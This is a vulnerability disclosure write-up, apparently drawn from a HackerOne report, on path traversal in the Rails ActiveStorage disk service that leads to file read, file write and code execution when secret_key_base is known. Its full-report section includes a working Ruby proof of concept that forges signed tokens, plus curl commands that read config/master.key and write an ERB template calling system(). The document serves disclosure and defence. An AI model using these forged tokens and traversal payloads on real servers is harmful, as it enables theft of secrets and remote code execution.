# Path Traversal in ActiveStorage Disk Service Leading to RCE via Signed Token Forgery

## Metadata
- **Source:** HackerOne
- **Report:** 2334455 | https://hackerone.com/reports/2334455
- **Submitted:** 2024-01-25
- **Reporter:** ooooooo_q
- **Program:** Ruby on Rails
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Path Traversal, Arbitrary File Write, Arbitrary File Read, Remote Code Execution, Cryptographic Weakness (Key Reuse)
- **CVEs:** None
- **Category:** memory-binary

## Summary
Rails ActiveStorage with disk service fails to properly validate file paths in signed tokens, allowing path traversal via directory traversal sequences (e.g., '../') in the 'key' parameter. When the secret_key_base is compromised, an attacker can forge valid tokens to read arbitrary files or write malicious files (such as ERB templates) to execute code on the server.

## Attack scenario
1. Attacker obtains the application's secret_key_base through misconfiguration, source code exposure, or other means
2. Attacker regenerates the ActiveStorage signing key using the leaked secret_key_base and the known key derivation algorithm (ActiveSupport::KeyGenerator with iterations: 1000)
3. Attacker crafts a malicious token with path traversal sequences in the 'key' field (e.g., '../../config/master.key' or '../app/views/users/show.text.erb')
4. Attacker signs the malicious token using the derived key with the MessageVerifier to produce a valid-appearing token
5. Attacker sends HTTP requests with the forged token to either read sensitive files or write malicious ERB templates
6. For write attacks, the server processes the request and writes attacker-controlled content (e.g., ERB code) to the traversed path, achieving RCE when templates are rendered

## Root cause
ActiveStorage's disk service does not properly sanitize or validate the 'key' parameter before using it in file operations. The path is used directly without stripping or validating against path traversal sequences. Additionally, the signing mechanism relies solely on the secret_key_base without additional protections against key compromise.

## Attacker mindset
An attacker with knowledge of the secret_key_base (perhaps from a previous breach, git exposure, or configuration leak) recognizes that ActiveStorage tokens can be forged. They leverage the predictable key generation algorithm to compute valid signing keys and craft path traversal payloads targeting configuration files or application templates to achieve file exfiltration or RCE.

## Defensive takeaways
- Implement strict path canonicalization and validation in ActiveStorage disk service to reject paths containing '../', './', or other traversal sequences before processing
- Add a whitelist-based path validation layer that restricts file operations to an explicitly defined storage directory
- Rotate and protect secret_key_base as a critical secret; implement detection mechanisms for its exposure
- Consider using S3 or other cloud storage services instead of local disk storage, which have better isolation guarantees
- Implement additional signing layers or cryptographic verification beyond MessageVerifier for blob tokens
- Add filesystem-level restrictions (e.g., chroot jails, container security policies) to limit the scope of path traversal damage
- Monitor and audit all file read/write operations through ActiveStorage endpoints
- Update to patched Rails versions that include proper path validation in ActiveStorage

## Variant hunting
Check if other Rails storage backends (Azure, Google Cloud Storage) have similar path validation flaws
Investigate whether other MessageVerifier-based signed token implementations in Rails reuse derivable keys
Test if null bytes, URL-encoded traversal sequences, or symbolic links bypass path validation
Examine if the vulnerability exists in older Rails versions or only in specific configurations (e.g., JSON serializer vs Marshal)
Search for similar path traversal patterns in other file upload/download handlers that use signed tokens
Verify if the vulnerability applies to both read and write operations or only one direction

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1006: Direct Volume Access
- T1083: File and Directory Discovery
- T1570: Lateral Tool Transfer
- T1059: Command and Scripting Interpreter
- T1005: Data from Local System
- T1040: Network Sniffing (to obtain secret_key_base if transmitted insecurely)

## Notes
The vulnerability is particularly severe because: (1) it requires only knowledge of secret_key_base, not application authentication; (2) the PoC demonstrates full end-to-end exploitation including RCE via ERB template injection; (3) Rails 7.1's shift to JSON serialization doesn't mitigate this issue since path validation is missing at the core level; (4) the attack surface is large given ActiveStorage is widely used in Rails applications. The report demonstrates the attack requires RAILS_ENV=production with specific serializer configuration, suggesting the vulnerability may be limited to certain deployments. However, the core issue (lack of path validation) is present in the framework itself.

## Full report
<details><summary>Expand</summary>

The danger of deserialization has been reduced in Rails 7.1 by increasing the number of settings that do not use Marshal in MessageVerifier.

However, another danger remains with AcitveStorage(`service: Disk`), which allows path traversal using the `key` value. However, the attacker must know the value of `secret_key_base`.

### PoC

```
❯ ruby -v
ruby 3.2.3 (2024-01-18 revision 52bb2ac0a6) [arm64-darwin22]

❯ rails new disk_traversal_7_1 -G -M -C -A -J -T 
=>  Rails 7.1.3

❯ bin/rails active_storage:install

❯ RAILS_ENV=production bin/rails db:migrate
```

edit `config/production.rb`

```
# config.force_ssl = true
...

config.active_support.message_serializer = :json
```

start server

```
❯ RAILS_ENV=production bundle exec rails s
```

`traversal.rb`

```ruby
content_disposition = "inline"
content_type = "text/plain"
name = "disk"

secret_key_base = Rails.application.secret_key_base

key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
secret = key_generator.generate_key("ActiveStorage")

serializer =  ActiveStorage.verifier.instance_variable_get(:@serializer)
puts serializer
puts "--"


key ="././../config/master.key"
verifier = ActiveSupport::MessageVerifier.new(secret, serializer: serializer)
read_token = verifier.generate(
          {
            key: key,
            disposition: content_disposition,
            content_type: content_type,
            service_name: name
          },
          purpose: :blob_key
        )

puts "read token:"
puts "#{read_token}"
puts "read curl: "
puts  "curl \"http://0.0.0.0:3000/rails/active_storage/disk/#{read_token}/test\""
puts "--"

target_file ="../app/views/users/show.text.erb"
content = "<% system('date') %>"
verifier = ActiveSupport::MessageVerifier.new(secret, serializer: serializer)
token_write = verifier.generate(
          {
            key: target_file,
            disposition: content_disposition,
            content_type: content_type,
            content_length: content.bytesize,
            service_name: name
          },
          purpose: :blob_token
        )

puts "write target_file:"
puts "#{target_file}"
puts "write token:"
puts "#{token_write}"
puts "write curl:"
puts "curl -X PUT -H \"Content-type: #{content_type}\" -d \"#{content}\" http://0.0.0.0:3000/rails/active_storage/disk/#{token_write}"
```

```
❯ RAILS_ENV=production bundle exec rails runner traversal.rb
W, [2024-01-25T22:57:10.036960 #16497]  WARN -- : You are running SQLite in production, this is generally not recommended. You can disable this warning by setting "config.active_record.sqlite3_production_warning=false".
ActiveSupport::Messages::SerializerWithFallback::JsonWithFallback
--
read token:
eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7
read curl:
curl "http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7/test"
--
write target_file:
../app/views/users/show.text.erb
write token:
eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e
write curl:
curl -X PUT -H "Content-type: text/plain" -d "<% system('date') %>" http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e
```

Access to read curl will get the file at any path, and access to write curl will write to any path and confirm the RCE.

## Impact

If `secret_key_base` is leaked, there is a risk of reading and writing files on the server and thereby an RCE.

</details>

---
*Analysed by Claude on 2026-05-12*
